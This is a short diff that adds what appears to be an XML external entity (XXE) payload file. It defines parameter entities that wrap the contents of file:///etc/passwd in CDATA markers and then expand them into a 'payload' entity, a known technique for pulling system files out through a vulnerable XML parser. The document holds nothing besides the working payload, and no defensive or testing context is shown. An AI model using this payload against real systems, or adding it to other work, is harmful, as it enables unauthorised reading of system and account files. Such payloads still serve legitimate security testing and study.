@@ -1,0 +1,5 @@
+<!ENTITY % start SYSTEM "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % end SYSTEM "]]>">
+<!ENTITY % wrapper "<!ENTITY payload '%start;%file;%end;'>">
+%wrapper;
